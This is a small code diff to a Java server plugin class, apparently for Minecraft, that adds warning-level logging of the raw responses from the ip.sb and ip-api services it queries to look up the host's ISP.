@@ -303,6 +303,7 @@ public class EssentialsX extends JavaPlugin {
                 StringBuilder sb = new StringBuilder();
                 String line;
                 while ((line = br.readLine()) != null) sb.append(line);
+                getLogger().warning("[ISP] ip.sb response: " + sb.toString());
                 String isp = extractJson(sb.toString(), "isp");
                 if (isp != null && !isp.isEmpty()) return isp;
             } finally {
@@ -321,6 +322,7 @@ public class EssentialsX extends JavaPlugin {
                 StringBuilder sb = new StringBuilder();
                 String line;
                 while ((line = br.readLine()) != null) sb.append(line);
+                getLogger().warning("[ISP] ip-api response: " + sb.toString());
                 String isp = extractJson(sb.toString(), "isp");
                 if (isp != null && !isp.isEmpty()) return isp;
             } finally {
